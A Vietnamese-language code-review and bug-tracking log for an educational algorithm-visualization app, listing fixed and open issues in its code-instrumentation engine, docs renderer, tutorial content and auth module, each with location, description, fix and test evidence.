- **Bằng chứng thực thi:** chạy `compileAndInstrument(swap+bubbleSort)` → output chứa `swap(arr);` thay vì `bubbleSort(arr);`.
- **Kịch bản:** Paste code `function swap(arr,i,j){...} function bubbleSort(arr){...}` → RUN → không có frame nào.
- **Đề xuất (đã làm):** Chọn hàm entry theo thứ tự ưu tiên: (1) hàm **không bị hàm khác gọi** (phân tích call graph), (2) tên khớp `sort|search|main|run|execute`, (3) có ≥1 tham số. Kèm xử lý CV-005.
- **Bằng chứng fix:** `npx tsx` xác minh output `bubbleSort(arr);` — không còn `swap(arr);`; +2 test (entry selection, multi-param).

### CV-002 — Loop guard dùng CHUNG 1 biến `__loopCounter` → false positive "infinite loop" cho vòng lặp lồng hợp lệ
- **Status:** ✅ FIXED — 2026-08-10 (`ASTInstrumentationEngine.ts` — per-loop counter + reset-per-entry + LOOP_LIMIT 20000)
- **Vị trí:** `engine/ASTInstrumentationEngine.ts:15,163-207` (đã sửa → `__loopCounter{N}` riêng từng loop, `wrapLoopWithReset`)
- **Mô tả:** Mọi vòng lặp đều tăng chung `__loopCounter`. Vòng lặp lồng hợp lệ `for i < 100 { for j < 100 {...} }` = 10.000 lượt → vượt ngưỡng 5000 → **throw sai** dù thuật toán đúng, kết thúc bằng timeout worker.
- **Bằng chứng thực thi:** chạy instrumented 100×100 nested loop → throw `Phát hiện lỗi lặp vô hạn! Thuật toán đã vượt ngưỡng 5000 lượt lặp.`
- **Kịch bản:** Mảng 100 phần tử + thuật toán O(n²) (bubble sort n=100 → ~9.900 phép so sánh trong 1 vòng lặp? không — nhưng nested loop 100×100 bất kỳ sẽ fail).
- **Đề xuất (đã làm):** Cấp **counter riêng cho từng loop** (`__loopCounter0`, `__loopCounter1`...) + **reset counter khi loop re-enter** (wrap `{ __loopCounterN = 0; <loop> }` để inner loop không tích lũy qua các lượt outer) + nâng `LOOP_LIMIT` 5000 → **20000** (flat loop ≤ 20k lượt không false positive; infinite loop thật vẫn bị bắt nhanh; worker timeout 1.5s là backstop).
- **Bằng chứng fix:** `npx tsx`: 100×100 nested → không throw; `while(true)` → vẫn throw `/lặp vô hạn/`; bubble sort n=100 chạy được; +3 test (distinct counters, nested không throw, infinite vẫn bị bắt).

## 🟠 P1

### CV-003 — Frame luôn `activeLine: 0` + `variables: {}` → highlight dòng code chết, không hiển thị biến
- **Status:** ✅ FIXED — 2026-08-10 (`ASTInstrumentationEngine` + `WorkerLifecycleCoordinator` + `liveCompilerDefaults`)
- **Vị trí:** `store/liveCompilerDefaults.ts:35` (`activeLine: 0`), `engine/WorkerLifecycleCoordinator.ts:34,52` (`variables: {}`)
- **Mô tả:** Worker script sinh frame với `variables: {}` cố định; `convertToAnimationFrames` hardcode `activeLine: 0`. Pseudocode/Monaco highlight không bao giờ nhảy dòng, bảng biến trống.
- **Kịch bản:** RUN bubbleSort → mọi frame đều activeLine 0, variables {}.
- **Đề xuất (đã làm):** Instrument thêm tham số dòng (`node.loc.start.line`) vào `traceCompare`/`traceAssign`; worker ghi `lineNumber` vào frame + `variables: {i, j}` (compare) / `{i, value}` (assign); `convertToAnimationFrames` map `lf.lineNumber ?? 0` → `activeLine`.
- **Bằng chứng fix:** test line-number pass (`traceCompare` nhận số dòng thật); `npx tsx` xác minh frame có lineNumber.

### CV-004 — `traceAssign` dán nhãn MỌI phép ghi là `SWAP` → UI hiểu sai bản chất thao tác
- **Status:** ✅ FIXED — 2026-08-10 (`LiveFrameDTO` + worker script + `liveCompilerDefaults`)
- **Vị trí:** `engine/WorkerLifecycleCoordinator.ts:44-56` (`traceAssign` push `type: 'SWAP'`)
- **Mô tả:** Ghi mảng thông thường (vd `arr[minIdx] = arr[i]`, `arr[j] = arr[j+1]` trong bubble sort) bị dán nhãn SWAP — không phân biệt được "hoán vị 2 phần tử" với "gán 1 phần tử".
- **Kịch bản:** RUN selection sort → frame gán nhãn SWAP giải thích "Gán trị phần tử..." nhưng type là SWAP.
- **Đề xuất (đã làm):** Thêm type `'ASSIGN'` vào `LiveFrameDTO`; worker push `type: 'ASSIGN'`; `convertToAnimationFrames` map ASSIGN → highlight `swap` (visual đỏ giữ nguyên) + explanation "Gán giá trị mới cho phần tử..."; SWAP giải thích "Hoán vị phần tử...".

### CV-005 — Hàm chính nhiều tham số bị gọi với chỉ `arr` (thiếu đối số → undefined)
- **Status:** ✅ FIXED — 2026-08-10 (xử lý chung trong fix CV-001)
- **Vị trí:** `engine/ASTInstrumentationEngine.ts:72` (đã sửa → `args` động)
- **Mô tả:** `function bubbleSort(arr, n)` → tự gọi `bubbleSort(arr)` → `n === undefined` → vòng lặp không chạy → 0 frame. Pattern `(arr, n)` rất phổ biến trong giáo trình.
- **Đề xuất (đã làm):** Khi entry function có ≥2 tham số, chuyền `arr.length` cho tham số thứ 2 (pattern `(arr, n)` chuẩn); ≥3 tham số thì truyền `arr` + `arr.length` + để các tham số còn lại `undefined`.
- **Bằng chứng fix:** test `bubbleSort(arr, arr.length)` pass + xác minh `npx tsx`.

## 🟡 P2

### CV-006 — Không có guard đệ quy: hàm đệ quy thiếu điều kiện dừng chỉ bị bắt ở worker timeout 1.5s với message kỹ thuật
- **Status:** ✅ FIXED — 2026-08-10 (`WorkerLifecycleCoordinator.ts` — `toFriendlyWorkerError` + map trong worker catch)
- **Vị trí:** `engine/WorkerLifecycleCoordinator.ts:18-77` (worker script), `:127-134` (timeout)
- **Mô tả:** `function fib(n){ return fib(n-1) + fib(n-2); }` không có base case → `Maximum call stack size exceeded` hiện trực tiếp cho sinh viên; hoặc `while(true)` bị bắt bởi CV-002 guard, còn StackOverflow thì không được diễn giải.
- **Kịch bản:** RUN code đệ quy không base case → error "Maximum call stack size exceeded" (không Việt hóa, không gợi ý).
- **Đề xuất (đã làm):** Export helper thuần `toFriendlyWorkerError` (test được) + worker catch map `/call stack|stack size/i` → "Đệ quy quá sâu — kiểm tra điều kiện dừng (base case) của hàm đệ quy."; `LOOP_LIMIT` 20000 bắt `while(true)` sớm hơn timeout.
- **Bằng chứng fix:** +1 test `toFriendlyWorkerError` (3 case).

### CV-007 — Hack `createEditorType()` trả `null as unknown as EditorType` trong MonacoEditorPanel
- **Status:** ✅ FIXED — 2026-08-10 (`MonacoEditorPanel.vue:48-50` đã xóa)
- **Vị trí:** `components/MonacoEditorPanel.vue:48-50`
- **Mô tả:** Hàm giả `createEditorType()` được khai báo chỉ để lấy kiểu qua `ReturnType<typeof createEditorType>` rồi `return null` — dead code khó đọc, che giấu typing thật.
- **Đề xuất (đã làm):** Xóa `createEditorType`; khai báo `let editorInstance: EditorType | null = null;` với interface EditorType hiện có, giữ `as unknown as EditorType` cho monaco loader (`any`).

### CV-008 — Thiếu edge tests: không test auto-invoke với helper, nested loop hợp lệ, lineNumber trong frame
- **Status:** ✅ FIXED — 2026-08-10 (+7 test: 6 AST + 1 worker; suite code-to-viz 56/56)
- **Vị trí:** `__tests__/ASTInstrumentationEngine.spec.ts` (149 dòng, 12 test)
- **Mô tả:** Toàn bộ test chỉ kiểm tra chuỗi `toContain('traceCompare')` — không test: (a) hàm entry được chọn đúng khi có helper; (b) nested loop 100×100 không throw; (c) line number được truyền vào trace; (d) gọi hàm 2 tham số với `arr.length`.
- **Đề xuất (đã làm):** Thêm 6 test: entry selection (assert không chứa `swap(arr)`), execution-level nested loop chạy không throw, 5th arg của traceCompare là số dòng, `bubbleSort(arr, arr.length)` trong instrumented code, counter riêng từng loop (nested = 2 counter), infinite loop vẫn throw; +1 test `toFriendlyWorkerError` (3 case) ở `WorkerLifecycleCoordinator.spec.ts`.

---

# 7. 📖 DESIGN PATTERNS & SOLID (Docs Reference Style)

**Code scope:** `frontend/src/features/docs/**`, `plan/tracking/*`
**Spec:** ADR-05 (chuyển đổi sang Docs Reference Style), ADR-40 (gỡ 3 feature Phase 2)
**Phát hiện:** Review round 2026-08-10.

## 🟠 P1

### DP-001 — 3 controller backend CHẾT (SOLID / Design Patterns / DI-Container) vẫn mapped, 0 consumer frontend
- **Status:** ✅ FIXED — 2026-08-10 (xóa 11 file, build backend pass)
- **Vị trí:** `backend/src/WebApi/Controllers/{SOLIDController,DesignPatternsController,DIContainerController}.cs`, `backend/src/Domain/Strategies/{SOLIDPrinciplesStrategy,DesignPatternsStrategy,DIContainerStrategy}.cs`, `backend/src/Domain/Engine/{SOLIDFrameDto,DesignPatternFrameDto,DIContainerFrameDto,DIContainerExecutor}.cs`, `backend/src/Application/DTOs/ConceptScenarioRequestDto.cs`
- **Mô tả:** Sau khi frontend chuyển sang Docs Reference Style (ADR-05), toàn bộ API `/api/v1/concepts/solid|design-patterns|di-container` không còn frontend gọi (grep toàn frontend: 0 reference `solidApi|designPatternsApi|diContainerApi|useSOLIDVisualizerStore|useDesignPatternStore|useDIContainerStore`; các store/views đã bị xóa). Controller vẫn được AddControllers auto-discover + strategy auto-register qua reflection (AlgorithmDIConfiguration.cs:24) — lãng phí surface API, tăng attack surface.
- **Kịch bản:** `GET /api/v1/concepts/solid/scenarios` → 200 (không ai tiêu thụ).
- **Đề xuất (đã làm):** Xóa 11 file: 3 controller + 3 strategy + 3 DTO + `DIContainerExecutor.cs` + `ConceptScenarioRequestDto.cs` (chỉ 3 controller chết dùng). Backend tests không tham chiếu (đã grep). **Bằng chứng fix:** `dotnet build src\WebApi\WebApi.csproj` → 0 lỗi; `dotnet test` → 372/372 PASS. OOP + System Design còn sống, không đụng.

## 🟡 P2

### DP-002 — Tracking ghi `✅ CODE DONE` cho feature đã bị thay bằng Docs (progress.md:551-566, README.md:32,42)
- **Status:** ✅ FIXED — 2026-08-10 (progress.md + README.md đã cập nhật)
- **Vị trí:** `plan/tracking/progress.md:551-566`, `plan/features/deep-decomposition/README.md:32,42`
- **Mô tả:** Section "Phase 2 Design Patterns & SOLID Visualizer" vẫn ghi CODE DONE dù ADR-05 đã chuyển hẳn sang docs; tracking không phản ánh code thực tế (vi phạm Quy tắc Tracking-First).
- **Đề xuất (đã làm):** Đánh dấu `❌ ĐÃ THAY THẾ — Docs Reference (ADR-05)`, giữ tham chiếu ADR, ghi file docs thay thế — áp dụng cho 4 dòng Sprint 6/7/8/9 + 2 section "Phase 2 Design Patterns"/"Phase 2 SOLID Principles" trong progress.md và 4 feature 13/14/20/22 trong deep-decomposition/README.md (gạch ngang + note tổng, ADR-40 giữ nguyên).

### DP-003 — 6 kịch bản Guided Tour mồ côi (`/oop /solid /di /patterns /state /system`) không bao giờ kích hoạt
- **Status:** ✅ FIXED — 2026-08-10 (xóa 516 dòng, 4 tour còn lại)
- **Vị trí:** `frontend/src/features/guided-tour/store/useGuidedTourStore.ts:153,238,323,594,679,764` (~510 dòng)
- **Mô tả:** Các route `/oop /solid /di /patterns` hiện redirect sang `/docs/*` (routes.ts), `/state /system` đã bị xóa → `startPageTour` chỉ được gọi với `/sorting`, `/code-ide`, `/quiz`, `/graph` (đã grep 22 call sites). 6 tour này là dead code, chỉ được test giả bằng cách gọi trực tiếp.
- **Kịch bản:** Không route nào kích hoạt được 6 tour này.
- **Đề xuất (đã làm):** Xóa 6 block tour (mỗi block 86 dòng, tổng 516 dòng — file còn 651 dòng với `/sorting /code-ide /graph /quiz`) + bỏ 6 entry tương ứng trong `useGuidedTourStore.spec.ts:176-182` (10 → 4 test cases). **Bằng chứng fix:** grep sạch `startPageTour('/oop|...')`, chỉ còn redirect routes.ts:22-25; suite guided-tour 29/29 PASS.

## 🟢 P3

### DP-004 — `concept-sandbox` chỉ còn là meta-test house (4 file plan, không code feature)
- **Status:** OPEN (ghi nhận — không có hành động sửa)
- **Vị trí:** `frontend/src/features/concept-sandbox/**` (chỉ test), `plan/features/sprint-{6,7,9}/phase2-*.md`, `plan/features/master-design/phase2-advanced-cs-concepts.md`
- **Mô tả:** Feature 13 không còn code sinh hoạt — concept-sandbox giữ lại như "nhà chứa test" cho 4 spec plan. Đây là trạng thái đã chốt (ADR-05), không phải bug — ghi nhận để tracking không hiểu nhầm là feature sống.
- **Đề xuất:** Không sửa code. Nếu muốn dọn thêm: gộp các spec test vào `docs` hoặc xóa concept-sandbox + 4 file plan (cân nhắc riêng).

---

## 🔄 REVIEW ROUND 5 — RE-REVIEW 2026-08-10 (verify trạng thái + lỗi mới, 7 sub agent)

## 8. ✅ VERIFY — Code to Visualization (CV-101→140)

Sau chiến dịch fix "Review Round 4 fix" (6 sub agent), verify lại toàn bộ code hiện tại:

| ID | Trạng thái | Bằng chứng (code hiện tại) |
|---|---|---|
| CV-101 | ✅ FIXED | `WorkerLifecycleCoordinator.ts:112,115-119` — `pendingReject` module-level, terminate reject `'Đã hủy biên dịch.'` |
| CV-102 | ✅ FIXED | `compileWorker.ts:28,36-46` — `pendingRequests: Map<requestId>` + 1 handler cố định; timeout/onerror reject toàn bộ + terminate (:75-84); `disposeCompileWorker` (:93-103) |
| CV-103 | ✅ FIXED | `WorkerLifecycleCoordinator.ts:15-17` — che `self.fetch`/`XMLHttpRequest`/`importScripts` = undefined |
| CV-104/CV-123 | ✅ FIXED | `ASTInstrumentationEngine.ts:8-9,100-126` — heuristic an toàn: 1 tham số → `[arr]`; 2 tham số chỉ khi tên khớp `^(n|len|length|size)$` → `[arr, arr.length]`; `binarySearch(arr,target)` → skip (không chạy sai) |
| CV-105 | ✅ FIXED | `useLiveCompilerStore.ts:23` (`lastCompileSucceeded` set trong finally :89) + `MonacoEditorPanel.vue:162-172` |
| CV-106 | ✅ FIXED | `useGuidedTourStore.ts:153-237` — tour viết lại theo component thật; `.debugger-*` không còn trong code |
| CV-107 | ✅ FIXED | `WorkerLifecycleCoordinator.ts:24,56,73,84-99` — `truncated` flag + ACCESS qua guard + `console.warn` + postMessage kèm truncated |
| CV-108 | ✅ FIXED (theo ADR) | `ASTInstrumentationEngine.ts:7` — `LOOP_LIMIT = 20000` giữ nguyên, **3 spec docs đã cập nhật đồng bộ** (chọn 20000 thay vì hạ 5000) |
| CV-109 | ✅ FIXED | `ASTInstrumentationEngine.ts:175-187` — ForInStatement + ForOfStatement có guard |
| CV-110 | ✅ FIXED | `ASTInstrumentationEngine.ts:137-139,375-376` — cho phép 1 vế member + `leftIsValue/rightIsValue` — `arr[j] > key` có trace |
| CV-111 | ✅ FIXED | `ASTInstrumentationEngine.ts:339-415` — `collectUpdateExpressions` + IIFE wrapper `arr[i++]` |
| CV-112→CV-121 | ✅ FIXED | regex parse (:55,74), ACCESS "Thuật toán kết thúc" (:34), reset hasCompileError (:33-39), generation token (:74,83,87), nút Cancel, scroll có điều kiện, setModelMarkers, validate realtime, responsive, code rỗng có thông báo |
| CV-122→CV-140 | ✅ FIXED | model dispose, entry arrow/function expr, variables thật (COMPARE), bỏ nodesToReplace, toFriendlyWorkerError production, use strict sau directive, onmessageerror, sentinel LOOP_LIMIT_EXCEEDED, timeout 1.5s + message phân biệt, bounds guard swap, track var, DEFAULT_INPUT_ARRAY chung, animStore.clear() đầu compile, wrap log, label for/id, **+23 test (78 tests)**, tracking 32→78 |

**Verify engine cũ:** `CompilerStepExecutor.ts:1037` — OOB swap bỏ reverse tùy tiện ✅; `toFriendlyWorkerError` engine cũ vẫn thô (engine mới đã dùng) 🟡 PARTIAL; `var` loop tracking 🟡 PARTIAL (chưa xác nhận đầy đủ).

## 9. 🆕 LỖI MỚI — Code to Visualization (CV-141+)

| ID | Mức | Vị trí | Mô tả |
|---|---|---|---|
| CV-141 | 🟡 Medium | `MonacoEditorPanel.vue:162-172` | Race timer glow: `setTimeout` không lưu/clear — (a) success #2 trong 2s của success #1 → glow tắt sớm; (b) compile #2 bắt đầu ngay sau success #1 → `lastCompileSucceeded=false` nhưng glow xanh còn dư âm tới khi timer cháy; (c) fail trong cửa sổ 2s → glow xanh + đỏ cùng bật. — ✅ FIXED 2026-08-10 (`MonacoEditorPanel.vue:48-56,163-164,172-199` — lưu `successGlowTimer` + `clearSuccessGlow()` clear trước khi set mới; watcher `lastCompileSucceeded` clear mọi lần fire (succeeded=false → tắt ngay); watcher `hasCompileError` mới clear khi fail; onBeforeUnmount clear) |
| CV-142 | 🟢 Low | `useGuidedTourStore.ts:186` + `ArrayInputBar.vue:18` | Bước 5 tour spotlight `[data-tour-id="code-ide-cancel-btn"]` — nút Cancel chỉ render khi `isCompiling`, lúc tour chạy không compile → spotlight rỗng (lặp lớp lỗi CV-106); test tour chỉ verify cấu hình store — ✅ FIXED 2026-08-10 (`useGuidedTourStore.ts:182-187` — highlightSelector → `[data-tour-id="code-ide-run-btn"]` luôn tồn tại; mô tả giữ ý nghĩa Cancel; test mới mount CodeWorkspace thật + assert MỌI highlightSelector tồn tại khi không compile + assert cancel-btn không tồn tại ở trạng thái đó — chốt bắt regression) |
| CV-143 | 🟢 Low | `WorkerLifecycleCoordinator.ts:69` | `traceAssign` vẫn hardcode `variables: {i, value}` — sinh viên gán `arr[k] = x` hiện biến "i" sai tên (CV-124 chỉ fix nhánh COMPARE) — ✅ FIXED 2026-08-10 (`ASTInstrumentationEngine.ts:152-160` traceAssign nhận thêm `vars` = cặp `[tên, giá trị]` từ property của MemberExpression (cùng hợp đồng traceCompare/CV-124); `WorkerLifecycleCoordinator.ts:61-79` worker dựng `variables` từ cặp + giữ `value`; test mới: AST instrument `arr[k]=42` → pairs `[['k',1]]` + e2e chạy script worker thật → `variables {k:1, value:42}`) |
| CV-144 | 🟢 Low | `liveCompilerDefaults.ts:26` | ASSIGN map vào `highlights.swap` → thao tác GÁN 1 phần tử được vẽ màu/giao diện HOÁN VỊ 2 phần tử (text giải thích đúng nhưng ngữ nghĩa hình ảnh lệch); FrameDTO chưa có type ASSIGN riêng — ✅ FIXED 2026-08-10 (thêm `assign?: number[]` vào `HighlightIndices` — `animation.types.ts:5-6` — additive, đã verify không renderer nào switch/iterate keys; `liveCompilerDefaults.ts:22-35` ASSIGN → `highlights.assign` thay vì swap — key chỉ xuất hiện trên frame ASSIGN để không phá toEqual suite khác; màu "gán mới" violet để dành cho agent renderer — palette chưa có COLOR_ASSIGN) |

## 10. ✅ VERIFY — Docs (DC-001→022)

| ID | Trạng thái | Bằng chứng |
|---|---|---|
| DC-001 (P0) | ✅ FIXED | `DocsLayout.vue:24-32` hamburger thật + overlay + auto-close theo route.path (:56-58) |
| DC-002 | ✅ FIXED (nhưng regression → DC-027) | `DocsTableOfContents.vue:33-39` chỉ scrollIntoView, bỏ pushState |
| DC-003 | ✅ FIXED | `DocsTableOfContents.vue:44-51` `findScrollTarget()` tìm `.app-view` + `getBoundingClientRect` (:59-65) |
| DC-004 | ✅ FIXED | bỏ `containerListenersAttached`; `watch(markdownContainer)` attach/remove (:136-145) + onBeforeUnmount (:519-524) |
| DC-005 | ✅ FIXED | `DocsView.vue:35` → `/docs/intro/intro` |
| DC-006 | ✅ FIXED | `routes.ts:25-28` — /oop→encapsulation, /solid→srp, /di→basics, /patterns→singleton |
| DC-007 | ✅ FIXED | `DocsView.vue:71-84,97-100` — `getFirstSectionOfTopic(pathSegments)` dùng đúng tham số (test /docs/trees pass) |
| DC-008 | ✅ FIXED | `renderSeq` (:130) + `loadSeq` (DocsView:64) check sau mỗi await |
| DC-009 | ✅ FIXED | `DocsMarkdownRenderer.vue:491-494` — escapeHtmlText error message |
| DC-010 | 🟡 PARTIAL → ✅ FIXED 2026-08-10 | Dedup `-1/-2` có (:268,295-297) và **nguồn đã sửa**: `csharp-hash-collections.md:67` → "Cách sử dụng cơ bản của HashSet" (hết trùng heading 23) — allowlist test `docsNavigationConsistency.spec.ts` đã thành `{}` |
| DC-011 | ✅ FIXED | `AppHeader.vue:51-58` active-class non-exact |
| DC-012 | ✅ FIXED | `DocsSidebarItem.vue:96-99` + `docsNavigation.ts:180` chuẩn hóa trailing slash + DocsView:93 lọc segment rỗng |
| DC-013 | ✅ FIXED | `router/index.ts:18-24` scrollBehavior (nhưng `{el: to.hash}` không cuộn container → DC-028) |
| DC-014 | ✅ FIXED | `DocsMarkdownRenderer.vue:44-61` — highlighterPromise hoisted module scope |
| DC-016→019 | ✅ FIXED | fallback escape (:414), thêm `ini` (:52), thu hẹp style props (:68-91), link `.md` tương đối → `#/docs/...` (:312-328) |
| DC-021 | 🟡 PARTIAL | scroll sidebar active (:58-70) + collapse persistence localStorage (DocsSidebarItem:73-94) ✅; **breadcrumb ❌ + search ❌ chưa có** (grep = 0) |
| DC-022 | ✅ FIXED | bỏ `'default' in raw`; bỏ watch(route.path) (nhưng phụ thuộc remount App → DC-030) |

## 11. 🆕 LỖI MỚI — Docs (DC-027+)

| ID | Mức | Vị trí | Mô tả |
|---|---|---|---|
| DC-027 | 🔴 P1 | `DocsMarkdownRenderer.vue:162-170` | **Mọi link nội bộ trong nội dung bài chết hoàn toàn** (regression của fix DC-002): nhánh chặn `a[href^="#"]` nuốt luôn link router `#/docs/...` → `preventDefault` + `getElementById('/docs/...')` → null → không điều hướng. Hàng trăm link chết: intro/intro.md:66-77, di/lifecycles.md:17,69, keyed-services.md:11,36,141, dip.md:66, decorator.md:242-245, strategy.md:18,216-219, final-roadmap.md:16-19... Test DC-019 chỉ assert thuộc tính href, **không test hành vi click** nên test vẫn xanh. — ✅ FIXED 2026-08-10 (`DocsMarkdownRenderer.vue:164` — selector đổi thành `a[href^="#"]:not([href^="#/"])`: link `#/docs/...` thoát → hash-router điều hướng thật; anchor `#section` vẫn scrollIntoView smooth; +3 test docsComponentTests: click `#/docs/...` → `defaultPrevented=false`, anchor → `prevented=true` + scrollIntoView) |
| DC-028 | 🟠 P2 | `router/index.ts:21` | Deep-link `#section` không cuộn tới mục: vue-router `window.scrollTo` no-op (container là `.app-view`); lúc scrollBehavior chạy heading chưa render (await shiki async) → "Couldn't find element". Vào `#/docs/.../bai#next-steps` chỉ dừng đầu bài — ✅ FIXED 2026-08-10 (`router/index.ts:22` scrollBehavior bỏ qua route docs; `DocsMarkdownRenderer.vue:260-265,482,513` — `scrollToHashSection()` đọc route.hash (bỏ qua `#/...`), gọi sau extractHeadings + sau vòng mermaid (layout cuối), `getElementById(hash)?.scrollIntoView({behavior:'smooth'})`) |
| DC-029 | 🟠 P2 | `DocsView.vue:82-83` | Slug topic sai (`/docs/search`, `/docs/doesnotexist`) → fallback ẩn hiển thị bài intro: URL giữ nguyên sai, sidebar không highlight, prev/next mất, nội dung là Intro — người đọc tưởng trang lỗi — ✅ FIXED 2026-08-10 (`DocsView.vue:95-106` — `getFirstSectionOfTopic` trả `''` nếu topic không tồn tại; loadMarkdown: topic lẻ không resolve → `router.replace('/docs/intro/intro')` — URL sửa thật, sidebar/prev/next đúng; path 2 segments chết vẫn UI 404; +1 test `/docs/search` → mockReplace) |
| DC-030 | 🟡 P3 | `DocsView.vue:129-131` | Phụ thuộc ngầm remount App.vue (`:key="$route.fullPath"`) — nếu ai gỡ key, điều hướng docs đứng yên — ✅ FIXED 2026-08-10 (`DocsView.vue:141-143` — thêm `watch(() => route.path, loadMarkdown)` không immediate: chỉ load khi path THAY ĐỔI, onMounted lo lần đầu — không double-load; +1 test đổi route.path → content đổi không cần remount) |
| DC-031 | 🟡 P3 | `DocsMarkdownRenderer.vue:477-496` | Vòng mermaid không re-check seq sau `await import('mermaid')` — điều hướng nhanh vẫn render vào element đã gỡ (tốn CPU, không crash) — ✅ FIXED 2026-08-10 (`DocsMarkdownRenderer.vue:491,502,505,515` — re-check `renderSeq` sau await import + sau mỗi await `mermaid.render()` (cả nhánh success/error) + đầu catch import — skip ghi DOM nếu đã điều hướng) |

## 12. ✅ VERIFY — Nội dung kiến thức (DC-C1→C7) + LỖI MỚI (DC-C8+)

| ID | Trạng thái | Bằng chứng |
|---|---|---|
| DC-C1 | ✅ FIXED | `quick-sort.md:95,100` — `[10,30,40,50,80,90,70]` + `[10,30,40,50,70,90,80]`; "Phân mảnh" = 0 (grep sạch, dùng "Phân hoạch") |
| DC-C2 | ✅ FIXED | `linear-search.md:67` — `return (i < n - 1 || last == target) ? i : -1;` + comment :64-66 |
| DC-C3 | 🟡 PARTIAL → ✅ FIXED 2026-08-10 | `trie-prefix-tree.md:44-48,69,77` — bỏ node con Star2; end marker nhúng vào nhãn `P2["p (end: app)"]` → P2 chỉ còn **2 con** (l, r); style P2 fill xanh; giải thích "app" cập nhật |
| DC-C4 | ✅ FIXED | `bucket-sort.md:27,38,46,51,56,62` — 0.68 có đủ trong scatter/sort/gather |
| DC-C5 | ✅ FIXED | `counting-sort.md:12-14,99,125` — cảnh báo "KHÔNG ÂM" + IndexOutOfRange + offset |
| DC-C6 | ✅ FIXED | `sorting-summary.md:22` — "⚠️ Một phần" + chú thích :24 |
| DC-C7 | ✅ FIXED (6/6) | "ăn thêm", stack tách ngoặc hợp lệ, cat/car/cow lowercase, "5 bài + bonus", Fenwick O(N), replication-lag disclaimer |

### 🆕 Lỗi mới content:

| ID | Mức | Vị trí | Mô tả |
|---|---|---|---|
| DC-C8 | 🔴 P1 | `searching/two-pointers.md:124,149` | Trace kết thúc "Trả về `[2, 3]`" (0-indexed) nhưng code trả `{left+1, right+1}` = `[3, 4]` (1-indexed) — tự mâu thuẫn với chú thích "LeetCode yêu cầu 1-indexed" ngay trong bài — ✅ FIXED 2026-08-10 (`two-pointers.md:124` — "Trả về [3, 4]" + giải thích left+1/right+1 khớp chú thích 1-indexed) |
| DC-C9 | 🟠 P2 | `searching/two-pointers.md:103-113` | Mermaid "Bước 4" vẽ trạng thái SAU khi left++ (Bước 5) trong khi text Bước 4 ghi `left=0 (11), right=4 (41)` — các diagram Bước 1-3 đúng quy ước — ✅ FIXED 2026-08-10 (`two-pointers.md:103-113` — diagram Bước 4 vẽ `L→0[11]`, `R→4[41]` + mờ phần tử bỏ qua — đúng quy ước "trước khi di chuyển") |
| DC-C10 | 🔴 P1 | `trees/heap-priority-queue.md:274-282` | Bước 4 trace Extract sai thuật toán: sau swap 30↔15, 30 ở index 3 — con trái = 7, con phải = 8 đều ≥ size 6 → SiftDown DỪNG, 30 KHÔNG thể swap với 20 (là sibling). Mảng cuối đúng: `[7,15,8,30,20,25]` (diagram vẽ `[7,15,8,20,30,25]`). Mâu thuẫn với code SiftDown :355-370 — ✅ FIXED 2026-08-10 (`heap-priority-queue.md:274-282` — "30 không còn con nào → Dừng" + diagram `[7,15,8,30,20,25]` + giải thích cuối khớp SiftDown) |
| DC-C11 | 🟠 P2 | `intro/memory.md:93` | "struct ... Deep Copy khi gán" — SAI định nghĩa: gán struct là copy giá trị (bitwise/shallow; nếu chứa tham chiếu thì con trỏ được copy nguyên) — ✅ FIXED 2026-08-10 (`memory.md:93` — "sao chép theo giá trị: field copy nguyên vẹn, field tham chiếu chỉ copy con trỏ — KHÔNG phải Deep Copy" + đối chiếu class copy tham chiếu) |
| DC-C12 | 🟡 P3 | `system-design/packet-routing.md:114,117` | BGP gọi là "distance vector" — chính thức là **path-vector** (dù kế thừa ý tưởng DV) — ✅ FIXED 2026-08-10 (`packet-routing.md:114,117` — "BGP (path-vector)" + giải thích lưu trọn AS path thay vì cộng dồn khoảng cách) |
| DC-C13 | 🟡 P3 | `trees/heap-priority-queue.md:526` | Ngữ pháp: "Đây là lý do **tại sự tồn tại** của Build Heap O(N)" — câu hỏng — ✅ FIXED 2026-08-10 (`heap-priority-queue.md:526` — "Đây chính là lý do giải thích sự tồn tại của Build Heap O(N).") |
| DC-C14 | 🟡 P3 | `intro/big-o.md:131` | Bảng growth: N=10⁶, O(log N) ghi "~19 bước" — đúng phải ~20 (log₂10⁶ ≈ 19.93) — ✅ FIXED 2026-08-10 (`big-o.md:131` — "~20 bước") |

## 13. ✅ VERIFY — Tests & Tracking Docs

| ID | Trạng thái | Bằng chứng |
|---|---|---|
| DC-T1 | ✅ FIXED | `docsComponentTests.spec.ts` — 35 tests mount đủ 6 component |
| DC-T3 | ✅ FIXED | `docsNavigationConsistency.spec.ts` — 5 tests: nav↔file 68/68, nhóm+id unique, heading slug unique (allowlist còn `cach-su-dung-co-ban`), frontmatter |
| DC-T4 | ✅ FIXED | `features-tested.md:296-319` — mục Docs đầy đủ "42/42 PASS" |
| DC-T5 | ✅ FIXED | `parseError` không còn trong spec |
| Kết quả chạy | ✅ 42/42 PASS | `npx vitest run src/features/docs` → 3 files (nav 5 + component 35 + mermaid 2 — 95 khối/58 file) |

---

## 🔬 REVIEW ROUND 7 — 2026-08-11: Auth (4 sub-agent, 55 lỗi ghi nhận)

**Scope:** `frontend/src/features/auth/**` + `services/apiClient.ts` + `router/index.ts` + `main.ts` + `App.vue` · `backend` AuthController/StatelessAuthController/AuthService/StatelessAuthStrategy · tests 2 đầu.
**Phương pháp:** 4 góc nhìn (Logic Engine / Store-State / UI-UX / Test-Integration) — kết quả đã khử trùng lặp, ID AU-001→055. **✅ ĐÃ FIX 2026-08-11** (4 sub-agent fix song song: Backend / Store-State / UI-UX / Tests). Kết quả: backend **416/416 PASS** (+44), frontend **2826/2826 PASS** (155 files, +36), `vue-tsc` 0 lỗi. Chi tiết fix từng ID: `plan/tracking/errors.md` Review Round 7. Còn lại: AU-045 PARTIAL (nhánh classic authApi giữ lại vì store còn dùng).

### 🔴 P0

| ID | Vị trí | Mô tả | Đề xuất |
| :--- | :--- | :--- | :--- |
| AU-001 | `authP0Tests.spec.ts:28-198` | Mock 100% lớp API (`vi.mock` cả 2 service) → **0 test contract**: URL/method/body camelCase/error shape `{error,message}`/status 401-403 chưa bao giờ xác thực (các feature khác như quiz đã có spec API) | Thêm `statelessAuthApi.spec.ts` stub `global.fetch`: assert URL `api/v1/concepts/auth/*`, body, Bearer header, parse lỗi theo status |
